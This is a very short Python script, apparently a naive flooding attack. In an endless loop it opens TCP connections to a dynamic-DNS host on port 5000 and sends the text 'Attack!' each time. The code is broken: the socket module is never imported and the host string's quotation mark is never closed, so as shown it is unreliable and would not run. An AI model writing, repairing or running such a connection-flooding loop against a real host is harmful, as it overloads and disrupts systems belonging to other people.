#!/usr/bin/python


while True:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("lougreen.ddns.net, 5000))
  s.send("Attack!")
